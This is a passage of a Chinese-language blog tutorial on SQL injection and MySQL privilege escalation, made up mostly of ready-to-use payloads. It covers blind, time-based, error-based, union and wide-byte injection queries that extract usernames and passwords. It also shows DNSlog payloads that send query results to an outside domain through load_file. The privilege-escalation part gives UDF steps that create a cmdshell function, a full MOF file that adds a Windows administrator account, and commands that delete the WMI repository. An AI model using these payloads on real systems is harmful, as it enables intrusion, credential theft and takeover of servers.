sql"><span class="hljs-string">&#x27;or (select length(column_name) from information_schema.COLUMNS where TABLE_NAME=&#x27;</span>表名<span class="hljs-string">&#x27; limit 0,1) = 10 --+</span><br><span class="hljs-string">&#x27;</span><span class="hljs-keyword">or</span> (<span class="hljs-keyword">select</span> length(column_name) <span class="hljs-keyword">from</span> information_schema.COLUMNS <span class="hljs-keyword">where</span> TABLE_NAME<span class="hljs-operator">=</span><span class="hljs-string">&#x27;表名&#x27;</span> limit <span class="hljs-number">1</span>,<span class="hljs-number">1</span>) <span class="hljs-operator">=</span> <span class="hljs-number">10</span> <span class="hljs-comment">--+ （第二个字段）</span><br></code></pre></td></tr></table></figure><p>猜解第一个字段名：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27;or mid((select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME = &#x27;</span>表名<span class="hljs-string">&#x27; limit 0,1),1,1) = &#x27;</span>i<span class="hljs-string">&#x27; --+</span><br><span class="hljs-string">或者</span><br><span class="hljs-string">&#x27;</span><span class="hljs-keyword">or</span> ORD(mid((<span class="hljs-keyword">select</span> COLUMN_NAME <span class="hljs-keyword">from</span> information_schema.COLUMNS <span class="hljs-keyword">where</span> TABLE_NAME <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;表名&#x27;</span> limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)) <span class="hljs-operator">&gt;</span> <span class="hljs-number">100</span> <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><p>直接猜解字段名：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27; or (select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=&#x27;</span>表名<span class="hljs-string">&#x27; limit 1,1) = &#x27;</span>username<span class="hljs-string">&#x27; --+</span><br></code></pre></td></tr></table></figure><p>猜解内容长度：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">假如已经知道字段名为  id   username password<br><span class="hljs-string">&#x27;or (select Length(concat(username,&quot;---&quot;,password)) from admin limit 0,1) = 16  --+</span><br></code></pre></td></tr></table></figure><p>猜解内容：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27;or mid((select concat(username,&quot;-----&quot;,password) from admin limit 0,1),1,1) = &#x27;</span>a<span class="hljs-string">&#x27; --+</span><br><span class="hljs-string">或者</span><br><span class="hljs-string">&#x27;</span><span class="hljs-keyword">or</span> ORD(mid((<span class="hljs-keyword">select</span> concat(username,&quot;-----&quot;,password) <span class="hljs-keyword">from</span> admin limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)) <span class="hljs-operator">&gt;</span> <span class="hljs-number">100</span> <span class="hljs-comment">--+    // ASCII码猜解</span><br></code></pre></td></tr></table></figure><p>直接猜解内容：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27;or (Select concat(username,&quot;-----&quot;,password) from admin limit 0,1 ) = &#x27;</span>admin<span class="hljs-comment">-----123456&#x27;   --+</span><br></code></pre></td></tr></table></figure><ul><li>时间盲注</li></ul><p>提交对执行时间敏感的函数sql语句，通过执行时间的长短来判断是否执行成功，比如正确的话会导致时间很长，错误的话会导致执行时间很短，这就是所谓的时间盲注</p><p>时间盲注会用到的函数:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">Sleep</span><span class="hljs-params">()</span></span>                           :延迟函数<br><span class="hljs-function"><span class="hljs-title">If</span><span class="hljs-params">(condition,true,false)</span></span>          :条件语句<br><span class="hljs-function"><span class="hljs-title">mid</span><span class="hljs-params">(str,start,length)</span></span>             :字符串截取<br><span class="hljs-function"><span class="hljs-title">ORD</span><span class="hljs-params">()</span></span>                             :转换成ascii码<br><span class="hljs-function"><span class="hljs-title">Length</span><span class="hljs-params">()</span></span>                          :统计长度<br><span class="hljs-function"><span class="hljs-title">version</span><span class="hljs-params">()</span></span>                         :查看数据库版本<br><span class="hljs-function"><span class="hljs-title">database</span><span class="hljs-params">()</span></span>                        :查看当前数据库名<br><span class="hljs-function"><span class="hljs-title">user</span><span class="hljs-params">()</span></span>                            :查看当前用户<br></code></pre></td></tr></table></figure><p>获取数据库总数：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27; and sleep(if((select count(SCHEMA_NAME) from information_schema.SCHEMATA)= 7,0,5))   // 如果数据库总数等于7响应时间为0秒，如果不等于7，相应时间为5秒</span><br></code></pre></td></tr></table></figure><p>猜解当前数据库长度:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27; and sleep(if((length(database()) = 8),0,5))--+     //当前数据库名长度为8</span><br></code></pre></td></tr></table></figure><p>猜解当前数据库名:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27; and sleep(if((ORD(mid(database(),1,1)) =115 ),0,5))--+    //ascii码115 就是 s</span><br></code></pre></td></tr></table></figure><p>猜解当前数据库表的总数:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">And</span> sleep(if((注入语句),<span class="hljs-number">0</span>,<span class="hljs-number">5</span>))   <span class="hljs-operator">/</span><span class="hljs-operator">/</span>类似布尔注入推理即可 ，例如：<br><span class="hljs-string">&#x27; And sleep(if((select count(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()) = 2,0,5)) --+</span><br></code></pre></td></tr></table></figure><p>其他的与布尔注入类似，参考构造即可</p><ul><li>dnslog盲注<sup id="fnref:7" class="footnote-ref"><a href="#fn:7" rel="footnote"><span class="hint--top hint--rounded" aria-label="https://www.cnblogs.com/xhds/p/12322839.html">[7]</span></a></sup></li></ul><p>如上盲注是没有回显结果的，只有靠逻辑表达式判断，那么有没有一种方式是可以使盲注有回显的呢，答案就是Dnslog盲注，如遇MySql的盲注时，可以利用内置函数load_file()来完成DNSLOGload_file()不仅能够加载本地文件，同时也能对诸如<code>www.xxx.com</code>这样的URL发起请求 使用DnsLog盲注仅限于windos环境</p><p>其原理就是数据库将查询到的数据拼接到我们设置的域名上，然后去查看DNS解析记录就可以拿到查询到的数据</p><p>构造语句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> LOAD_FILE(CONCAT(<span class="hljs-string">&#x27;\\\&#x27;</span>,(<span class="hljs-keyword">select</span> database(),<span class="hljs-string">&#x27;.github.io\\abc&#x27;</span>)))  <span class="hljs-comment">-- 通过SQL语句查询内容，作为请求的一部分发送至Dnslog</span><br></code></pre></td></tr></table></figure><p>获取数据库名：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27; and load_file(concat(&#x27;</span>\\\\<span class="hljs-string">&#x27;,(select database()),&#x27;</span>.github.io\\abc<span class="hljs-string">&#x27;))--+</span><br></code></pre></td></tr></table></figure><p>获取数据表:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27; and load_file(concat(&#x27;</span>\\\\<span class="hljs-string">&#x27;,(select table_name from information_schema.tables where table_schema=database() limit 0,1),&#x27;</span>.github.io\\abc<span class="hljs-string">&#x27;))--+</span><br></code></pre></td></tr></table></figure><p>获取表中的字段名:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27; and load_file(concat(&#x27;</span>\\\\<span class="hljs-string">&#x27;,(select column_name from information_schema.columns where table_name=&#x27;</span>users<span class="hljs-string">&#x27; limit 0,1),&#x27;</span>.github.io\\abc<span class="hljs-string">&#x27;))--+</span><br></code></pre></td></tr></table></figure><p>获取表中字段下的数据:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27; and load_file(concat(&#x27;</span>\\\\<span class="hljs-string">&#x27;,(select password from users limit 0,1),&#x27;</span>.github.io\\abc<span class="hljs-string">&#x27;))--+</span><br><span class="hljs-string">&#x27;</span> <span class="hljs-keyword">and</span> load_file(concat(<span class="hljs-string">&#x27;\\\\&#x27;</span>,(<span class="hljs-keyword">select</span> username <span class="hljs-keyword">from</span> users limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-string">&#x27;.github.io\\abc&#x27;</span>))<span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><p>因为在load_file里面不能使用@ ~等符号所以要区分数据我们可以先用group_ws()函数分割在用hex()函数转成十六进制即可 出来了再转回去:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27; and load_file(concat(&#x27;</span>\\\\<span class="hljs-string">&#x27;,(select hex(group_ws(&#x27;</span><span class="hljs-operator">~</span><span class="hljs-string">&#x27;,username,password)) from users limit 0,1),&#x27;</span>.github.io\\abc<span class="hljs-string">&#x27;))--+</span><br></code></pre></td></tr></table></figure><h4 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h4><p>报错注入有时也被归类为<a href="#%E7%9B%B2%E6%B3%A8">盲注</a>，通过输入特定语句使页面报错，网页中则会输出相关错误信息，从而是我们得到想要的基本信息——数据库名、版本、用户名等</p><p>报错注入又分为两种：</p><ul><li>数据库bug报错</li><li>数据库函数报错</li></ul><p>数据库BUG报错注入需要的函数：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">只要是count()，rand() ，group by 三个函数连用就会造成这种报错<br><span class="hljs-function"><span class="hljs-title">left</span><span class="hljs-params">(rand()</span></span>,<span class="hljs-number">3</span>)     :不一定报错<br><span class="hljs-function"><span class="hljs-title">floor</span><span class="hljs-params">(rand(<span class="hljs-number">0</span>)</span></span>*<span class="hljs-number">2</span>)    :一定报错<br><span class="hljs-function"><span class="hljs-title">round</span><span class="hljs-params">(x,d)</span></span>       :x指要处理的数，d是指保留几位小数<br><span class="hljs-function"><span class="hljs-title">concat</span><span class="hljs-params">()</span></span>         :字符串拼接<br></code></pre></td></tr></table></figure><p>函数报错注入需要的函数：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">Updatexml</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">Exp</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">Geometrycollection</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">Polygon</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">Multipoint</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">Multilinestring</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">Multipolygon</span><span class="hljs-params">()</span></span><br>等.....<br></code></pre></td></tr></table></figure><p>利用数据库bug报错注入：</p><p>爆数据库的两种方法：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27; and (select concat(floor(rand(0)*2),&quot;===&quot;,(select database())) as xx,count(1) from information_schema.columns group by xx)</span><br><span class="hljs-string">&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> concat(<span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">0</span>)<span class="hljs-operator">*</span><span class="hljs-number">2</span>),&quot;===&quot;,(<span class="hljs-keyword">select</span> database())) <span class="hljs-keyword">as</span> xx,<span class="hljs-built_in">count</span>(<span class="hljs-number">1</span>),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> xx<br></code></pre></td></tr></table></figure><p>爆表名:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27; union select concat(floor(rand(0)*2),&quot;===&quot;,(select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=database() limit 3,1)) as xx,count(1),3 from information_schema.columns group by xx--+</span><br></code></pre></td></tr></table></figure><p>爆字段：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27; union select concat(floor(rand(0)*2),&quot;===&quot;,(select column_name from information_schema.columns where TABLE_SCHEMA=database() limit 8,1)) as xx,count(1),3 from information_schema.columns group by xx--+</span><br></code></pre></td></tr></table></figure><p>猜解内容：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27; and ORD(mid((select concat(username,&quot;-----&quot;,password) from security.users limit 0,1),1,1)) =68 %23   -- 逐个猜解内容（详情见布尔注入）</span><br></code></pre></td></tr></table></figure><p>利用特定函数报错注入的流程：</p><p>与利用数据库bug报错步骤相同，比如Updatexml()的注入语句如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27; and 1=(updatexml(1,concat(0x3a,(select database() )),1))--+</span><br></code></pre></td></tr></table></figure><h4 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h4><p>联合查询注入利用的前提条件：</p><p>页面上有显示位，什么是显示位呢？在一个在一个网站的正常页面，服务端执行SQL语句查询数据库中的数据，客户端将数据展示在页面中，这个展示数据的位置就叫显示位</p><p>示例代码：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> form tp_user <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span> <span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,database(),<span class="hljs-number">4</span>,<span class="hljs-number">5</span>;<br></code></pre></td></tr></table></figure><h4 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h4><p>堆叠注入(stacked injections)从名词的含义就可以看到应该是一堆sql语句(多条)一起执行，而在真实的运用中也是这样的，我们知道在mysql 中，主要是命令行中，每一条语句结尾加“;”表示语句结束的，这样我们就想到了是不是可以多句一起使用就叫做堆叠注入</p><p>示例代码：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> form users; <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> form emails;<br></code></pre></td></tr></table></figure><h4 id="宽字节注入-8"><a href="#宽字节注入-8" class="headerlink" title="宽字节注入[8]"></a>宽字节注入<sup id="fnref:8" class="footnote-ref"><a href="#fn:8" rel="footnote"><span class="hint--top hint--rounded" aria-label="https://cloud.tencent.com/developer/article/1920885">[8]</span></a></sup></h4><p>宽字节注入就是用宽字节去中和掉转义中加的<code>/</code>这个符号</p><h5 id="注入原理"><a href="#注入原理" class="headerlink" title="注入原理"></a>注入原理</h5><p>PHP中在 magic_quotes_gpc=On 的情况下，提交的参数中如果带有单引号<code>&#39;</code>，就会被自动转义<code>\&#39;</code>，这样就没法闭合单引号了<br>GBK双字节编码：一个汉字用两个字节表示，首字节对应<code>0×81-0xFE</code>，尾字节对应<code>0×40-0xFE</code>（除<code>0×7F</code>），刚好涵盖了转义符号<code>\</code>对应的编码<code>0×5C</code>,<code>0xD5-0×5C</code> 对应了汉字“诚”，URL编码用百分号加字符的16进制编码表示字符，于是 <code>%d5%5c</code> 经URL解码后为“诚”</p><p>下面分析攻击过程：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">/test.php?username=test%d5′%20or%201=1%23<br></code></pre></td></tr></table></figure><p>经过浏览器编码，username参数值为(单引号的编码0×27)：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">username=test%d5%27%20or%201=1%23<br></code></pre></td></tr></table></figure><p>经过php的url解码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">username=test 0xd5 0×27 0×20 or 0×20 1=1 0×23 (为了便于阅读，在字符串与16进制编码之间加了空格)<br></code></pre></td></tr></table></figure><p>经过PHP的GPC自动转义变成(单引号<code>0×27</code>被转义成<code>&#39;</code>对应的编码<code>0×5c0×27</code>)：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">username=test 0xd5 0×5c 0×27 0×20 or 0×20 1=1 0×23<br></code></pre></td></tr></table></figure><p>因为在数据库初始化连接的时候SET NAMES ‘gbk’，<code>0xd50×5c</code>解码后为诚，<code>0×27</code>解码为<code>&#39;</code>，<code>0×20</code>为空格，<code>0×23</code>为mysql的注释符<code>#</code></p><p>上面的SQL语句最终为： </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">WHERE</span> username<span class="hljs-operator">=</span><span class="hljs-string">&#x27;test诚&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span>#;<br></code></pre></td></tr></table></figure><p>注释符#后面的字符串已经无效，等价于：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">WHERE</span> username<span class="hljs-operator">=</span><span class="hljs-string">&#x27;test诚&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span>;<br></code></pre></td></tr></table></figure><p>条件变成永真，成功注入</p><p>补充：</p><p><code>0xD50×5C</code>不是唯一可以绕过单引号转义的字符，<code>0×81-0xFE</code>开头<code>0×5C</code>的字符应该都可以</p><h4 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h4><p>二次注入是通过与数据库服务器进行交互的过程再次进行注入</p><h5 id="注入原理-1"><a href="#注入原理-1" class="headerlink" title="注入原理"></a>注入原理</h5><p>在第一次进行数据库插入数据的时候，仅仅只是使用了 addslashes 或者是借助 get_magic_quotes_gpc 对其中的特殊字符进行了转义，在后端代码中可能会被转义，但在存入数据库时还是原来的数据，数据中一般带有<code>&#39;</code>和<code>#</code>号，然后下次使用在拼凑SQL中，所以就形成了二次注入</p><h3 id="按拼接位置分类"><a href="#按拼接位置分类" class="headerlink" title="按拼接位置分类"></a>按拼接位置分类</h3><p>拼接位置没什么好讲的，一笔带过就行</p><h4 id="where-注入"><a href="#where-注入" class="headerlink" title="where 注入"></a>where 注入</h4><h4 id="order-by注入"><a href="#order-by注入" class="headerlink" title="order by注入"></a>order by注入</h4><h4 id="limit-注入"><a href="#limit-注入" class="headerlink" title="limit 注入"></a>limit 注入</h4><h4 id="values-注入"><a href="#values-注入" class="headerlink" title="values 注入"></a>values 注入</h4><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="MySql提权"><a href="#MySql提权" class="headerlink" title="MySql提权"></a>MySql提权</h3><h4 id="UDF提权"><a href="#UDF提权" class="headerlink" title="UDF提权"></a>UDF提权</h4><p>UDF（用户定义函数）是一类对MySQL服务器功能进行扩充的代码，通过添加新函数，性质就像使用本地MySQL函数abs()或concat()</p><p>前提条件：</p><ul><li>一个拥有insert和delete权限的账户</li><li>MySQL的secure_file_priv不为NULL，且目标目录本身可写</li><li>MySQL版本大于5.1时，udf.dll文件须放置于MySQL安装目录下的lib\plugin文件夹（一般需要手工创建）下</li><li>MySQL版本小于5.1时:<ul><li>Windows2000下须放置于c：\Winnt</li><li>Windows2003下须放置于c：\Windows</li></ul></li></ul><p>udf.dll&amp;udf.so 来源：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">sqlmap\data\udf\mysql\linux&amp;windows <span class="hljs-comment">// 如需解码用sqlmap\extra\cloak\cloak.py解码即可</span><br>python3 cloak<span class="hljs-selector-class">.py</span> -d -<span class="hljs-selector-tag">i</span> udf<span class="hljs-selector-class">.dll_</span> - o udf<span class="hljs-selector-class">.dll</span> <span class="hljs-comment">//解码命令，so文件同理</span><br></code></pre></td></tr></table></figure><p>查看mysql有无写入权限：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">show</span> <span class="hljs-keyword">global</span> variables <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%secure%&#x27;</span> <span class="hljs-comment">-- secure_file_priv的值为&#x27;&#x27;时，表示不限制权限，值为null表示不允许导入|导出</span><br></code></pre></td></tr></table></figure><p>创建/lib/plugin目录：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span>@<span class="hljs-variable">@basedir</span>;    <span class="hljs-comment">-- 查找MySQL的目录</span><br><span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;udf.ll&#x27;</span> <span class="hljs-keyword">into</span> dumpfile<span class="hljs-string">&#x27;C:\\Program Files\\MySQL\\MySQLServer5.1\\lib::$INDEX_ALLOCATION&#x27;</span>;    <span class="hljs-comment">-- 利用NTFS ADS创建lib目录</span><br><span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;udf.dll&#x27;</span> <span class="hljs-keyword">into</span> dumpfile <span class="hljs-string">&#x27;C:\\Program  Files\\MySQL\\MySQLServer 5.1\\lib\\lplugin::$INDEX_ALLOCATION&#x27;</span>;    <span class="hljs-comment">-- 利用NTFS ADS创建plugin目录</span><br></code></pre></td></tr></table></figure><p>写入udf.dll文件：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> hex(load_file(<span class="hljs-string">&#x27;path\\udf.dll&#x27;</span>)) <span class="hljs-keyword">into</span> dumpfile <span class="hljs-string">&#x27;mysqlpath\\lib\\plugin\\udf.dll&#x27;</span>; <span class="hljs-comment">--  windows下目录结构需要转义双写</span><br><span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;hexcode&#x27;</span> <span class="hljs-keyword">into</span> dumpfile <span class="hljs-string">&#x27;mysqlpath\\lib\\plugin\\udf.dll&#x27;</span>;  <span class="hljs-comment">-- 或者直接写入十六进制数据</span><br></code></pre></td></tr></table></figure><p>创建自定义函数：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">create</span> <span class="hljs-keyword">function</span> cmdshell <span class="hljs-keyword">returns</span> string soname <span class="hljs-string">&#x27;udf.dll&#x27;</span>;<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> mysql.func;  <span class="hljs-comment">--  查看新增的自定义函数</span><br></code></pre></td></tr></table></figure><p>执行函数：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> cmdshell(<span class="hljs-string">&#x27;net user admin12 admin12 /add&#x27;</span>);<br></code></pre></td></tr></table></figure><h4 id="MOF提权"><a href="#MOF提权" class="headerlink" title="MOF提权"></a>MOF提权</h4><p>MOF是Windows系统的一类文件（在C:/Windows/System32/wbem/mof/nullevt.mof）叫做托管对象格式，它会每隔五秒就会去监控进程创建和死亡</p><p>提权条件：</p><ul><li>目标系统是Windows2000、WindowsXP或Windows2003</li><li>MySQL的secure_file_priv不为NULL，且目标目录本身可写</li><li>拥有MySQL数据库的root账号权限</li><li>拥有将MOF文件写入到目录“%SystemRoot%\System32\Wbem\MOF”的权限</li></ul><p>nullevt.mof 文件内容：</p><figure class="highlight vbs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs vbs">#pragma name<span class="hljs-built_in">space</span>(<span class="hljs-string">&quot;\\\\.\\root\\subscription&quot;</span>)<br><br>instance of __EventFilter as $EventFilter<br>&#123;<br>EventNamespace = <span class="hljs-string">&quot;Root\\Cimv2&quot;</span>;<br>Name = <span class="hljs-string">&quot;filtP2&quot;</span>;<br>Query = <span class="hljs-string">&quot;Select * From __InstanceModificationEvent &quot;</span><br><span class="hljs-string">&quot;Where TargetInstance Isa \&quot;</span>Win32_LocalTime\<span class="hljs-string">&quot; &quot;</span><br><span class="hljs-string">&quot;And TargetInstance.Second = 5&quot;</span>;<br>QueryLanguage = <span class="hljs-string">&quot;WQL&quot;</span>;<br>&#125;;<br><br>instance of ActiveScriptEventConsumer as $Consumer<br>&#123;<br>Name = <span class="hljs-string">&quot;consPCSV2&quot;</span>;<br>ScriptingEngine = <span class="hljs-string">&quot;JScript&quot;</span>;<br>ScriptText =<br><span class="hljs-string">&quot;var WSH = new ActiveXObject(\&quot;</span>WScript.Shell\<span class="hljs-string">&quot;)\nWSH.run(\&quot;</span>net.exe user admin <span class="hljs-number">123456</span> /add\<span class="hljs-string">&quot;)&quot;</span>; //命令执行的地方<br>&#125;;<br><br>instance of __FilterToConsumerBinding<br>&#123;<br>Consumer = $Consumer;<br>Filter = $EventFilter;<br>&#125;;<br></code></pre></td></tr></table></figure><p>导入上传的mof文件到C:/Windows/System32/wbem/mof/nullevt.mof即可：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> load_file(<span class="hljs-string">&#x27;my.mof&#x27;</span>) <span class="hljs-keyword">into</span> dumpfile <span class="hljs-string">&#x27;C:\\Windows\\System32\\wbem\\mof\\nullevt.mof&#x27;</span>;<br></code></pre></td></tr></table></figure><p>删除mof文件：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cmd"><span class="hljs-built_in">net</span> stop winmgmt<br><span class="hljs-built_in">rmdir</span> /s /q c:\window\System32\wbem\repository<br><span class="hljs-built_in">net</span> user admin /delete<br><span class="hljs-built_in">net</span> <span class="hljs-built_in">start</span> winmgmt<br></code></pre></td></tr></table></figure><h4 id="启动项提权"><a href="#启动项提权" class="headerlink" title="启动项提权"></a>启动项提权</h4><p>写入开机启动项然后重启即可</p><h3 id="MSSQL提权-9"><a href="#MSSQL提权-9" class="headerlink" title="MSSQL提权[9]"></a>MSSQL提权<sup id="fnref:9" class="footnote-ref"><a href="#fn:9" rel="footnote"><span class="hint--top hint--rounded" aria-label="https://zhuanlan.zhihu.com/p/591938680">[9]</span></a></sup></h3><h4 id="xp-cmdshell提权"><a 